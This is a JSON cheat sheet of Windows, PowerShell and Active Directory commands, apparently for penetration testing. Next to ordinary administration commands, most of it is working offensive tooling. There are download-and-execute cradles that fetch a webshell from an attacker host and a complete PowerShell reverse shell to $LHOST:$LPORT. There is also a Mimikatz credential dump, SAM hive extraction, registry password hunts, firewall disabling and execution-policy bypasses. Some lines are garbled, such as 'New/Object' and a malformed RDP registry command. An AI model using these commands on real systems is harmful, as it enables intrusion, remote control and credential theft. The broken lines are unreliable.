{ "1": {
     "name": "PowerShell: Important One-liners",
     "data": {
       "Eliminate Line Duplications": "Get-Content .\\file.txt | Sort-Object -Unique | Set-Content .\\file.txt",
       "Match Regex in line": "(Get-Content .\\file.txt) | ForEach-Object { if ($_ -match '^\\S+/') { $matches[0] } | Sort-Object -Unique | Set-Content file.txt",
       "Replace Charcter in Line": "(Get-Content .\\file.txt) | ForEach-Object { $_ -replace '^/', '' } | Sort-Object -Unique | Set-Content file.txt"
     }
   },
  "2": {
    "name": "Powershell: General",
    "data": {
      "ls: List Files": "Get-ChildItem .\\file.txt",
      "cat: List Files": "Get-Content .\\file.txt",
      "Netstat": "netstat -an",
      "System Info": "systeminfo",
      "User Information": "net user",
      "Network information":"netstat -ano",
      "Test Connection #1": "ping $RHOST",
      "Test Connection #2":"Test-NetConnection -ComputerName $RHOST -Port $RPORT",
      "List Shares": "net share",
      "Download File #1": "certutil.exe -urlcache -f http://$LHOST/webshell.php webshell.php",
      "Download File #2": "Invoke-RestMethod -Uri http://$LHOST:$LPORT/webshell.php -OutFile webshell.php",
      "Download File #3": "wget \"http://$LHOST:$LPORT/webshell.php\" -outfile \"webshell.php\"",
      "Download File #4": "powershell.exe IEX(New/Object Net.WebClient).DownloadString(\"http://$LHOST:$LPORT/$PATH/webshell.php\")",
      "Download & Run #1": "iex (iwr http://$RHOST/$PATH/webshell.php -usebasicparsing)",
      "Download & Run #2": "(New-Object System.Net.WebClient).DownloadFile('http://$LHOST:$LPORT/webshell.php','webshell.php');Start-Process 'webshell.php'",
      "Download & Run #3": "Invoke-Expression (new-object System.Net.WebClient).DownloadString('http://$LHOST/webshell.php')",
      "Search for compilers":"where /R \\ csc.exe",
      "Search for files":"find /S /A-d /R -b  \"C:\\*user.txt\"",
      "Run a shell":"Start-Job -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}",
      "Service: Status":"sc.exe query $SERVICE",
      "Service: Preferences and Settings":"sc.exe qc $SERVICE",
      "Service: Start and Stop":"sc.exe start|stop $SERVICE",
      "Service: Configure":"sc.exe config $SERVICE [option]=[value]"
    }
  },
  "3": {
    "name": "Powershell: Privilage Esclation",
    "data": {
      "Bypass Protection #1": "powershell --exec bypass",
      "Bypass Protection #2": "powershell -ep bypass",
      "Bypass Protection #3": "powershell -ExecutionPolicy Bypass -File webshell.php -Command \"whoami\"",
      "Stored Credentials":"cmdkey /list",
      "Run as User":"runas /user:$DOMAIN\\$USER powershell.exe",
      "Run with User's Saved Credentials":"runas /savecred /user:$USERNAME cmd.exe",
      "Port Forward": "plink.exe -L 65443:$RHOST:$RPORT '$USERNAME@$RHOST'",
      "List Hidden Files": "Get-ChildItem -Force -Recurse -Path .",
      "Mimikatz: Download & Run": "powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\" > C:\\Users\\%username\\Downloads\\pass.txt\n",
      "Get Logs": "Get-EventLog -list",
      "Get-MpComputerStatus":"Get-MpComputerStatus | select RealTimeProtectionEnabled",
      "Group List":"Get-NetGroup -GroupName * -",
      "Check Privileges":"whoami /priv",
      "Create Hidden File":"mkdir hiddenfolder && attrib +h hiddenfolder",
      "Check Sysmon":"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }",
      "Check Permissions":"icacls c:\\tasks\\schtask.bat",
      "Retrieve PuTTY Credentials":"reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s",
      "Get Hashas":"reg save hklm\\sam .\\sam",
      "Scheduled Tasks":"schtasks /query /tn vulntask /fo list /v",
      "View History":"type $Env:[$USERNAME]\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
      "Find ISS conf":"type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString",
      "wmic Tool":"wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v 'C:\\Windows\\' | findstr /i /v \"\"\"",
      "PsExec to run cmd":"psexec -i -s //$RHOST cmd.exe",
      "Create hidden file/folder":"$folderPath = \"$PATH/webshell.php\" & New-Item -Path $folderPath -ItemType Directory & Set-ItemProperty -Path $folderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)",
      "SQL list":"Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} -",
      "Get user accounts":"wmic useraccount get name,sid",
      "Get pipe information":"((Get-ChildItem \\\\.\\pipe\\).name)[-1..-5]",
      "Enable RDP":"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v REG_DWORD /d 0 /f",
      "Load PS Shell Bypass":"powershell -ep bypass"
    }
  },
  "4": {
    "name": "Windows: Command Prompt",
    "data": {
      "Find File": "dir /s/b $FILE.EXE",
      "Search for a string in a file": "findstr \"*password*\"",
      "Search for a string in a files": "findstr /si '<ProcessCreate onmatch=\"exclude\">' C:\\tools\\*"

    }
  },
  "5": {
    "name": "AD",
    "data": {
      "Netstat": "netstat -an",
      "User Information": "net user $USER /$DOMAIN",
      "Domain Users": "net user /$DOMAIN",
      "Domain Info": "nltest /dclist:$DOMAIN",
      "Ping a host": "ping $RHOST",
      "Check Group Membership": "net group $GROUP /$DOMAIN",
      "Dump Hashes": "samdump system sam",
      "Active Directory domain controller": "%SystemRoot%\\NTDS",
      "User information": "Get-ADUser -Filter * -SearchBase \"CN=Users,DC=$DOMAIN,DC=COM\"",
      "Stored credentials":"cmdkey /list",
      "Get passwords from registry (HKLM)":"Reg query HKLM /f password /t REG_SZ /s",
      "Get passwords from registry (HKCU)":"Reg query HKCU /f password /t REG_SZ /s",
      "Enter PS session remotely":"Enter-PSSession -ComputerName $DOMAIN",
      "Reset password for AD":"Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose",
      "Change pass after logon AD":"Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose",
      "Create user on domain":"net user '$USERNAME' '$PASSWORD' /ADD /$DOMAIN",
      "Get-NetComputer":"Get-NetComputer -fulldata | select operatingsystem",
      "Get users on domain":"Get-NetUser | select cn",
      "Network": "ncpa.cpl",
      "System info":"sysdm.cpl",
      "GPO": "gpmc.msc"
    }
  },
  "6": {
    "name": "Windows Protection",
    "data":{
      "FW: Status":"Get-NetFirewallProfile | Format-Table Name, Enabled",
      "FW: Rules":"Get-NetFirewallRule | select DisplayName, Enabled, Description",
      "FW: Set profile":"Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False",
      "AV: Status": "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct",
      "Defender: Status":"Get-Service WinDefend",
      "Defender: Latest alerts":"Get-MpThreat",
      "WMIC: Test AV":"wmic /namespace:\\root\\securitycenter2 path antivirusproduct"
    }
  }
}